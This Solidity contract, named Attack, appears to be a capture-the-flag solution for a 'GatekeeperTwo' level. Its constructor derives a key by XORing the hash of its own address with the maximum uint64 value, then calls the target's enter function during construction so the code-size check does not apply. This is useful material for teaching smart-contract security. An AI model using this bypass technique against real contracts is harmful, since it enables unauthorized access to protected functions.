// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    constructor(address gatekeeperTwo) {

        uint64 maxUnit64 = type(uint64).max;
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ maxUnit64);

        (bool pass, ) = gatekeeperTwo.call(abi.encodeWithSignature(("enter(bytes8)"), key));
        require(pass);

    }
    
}

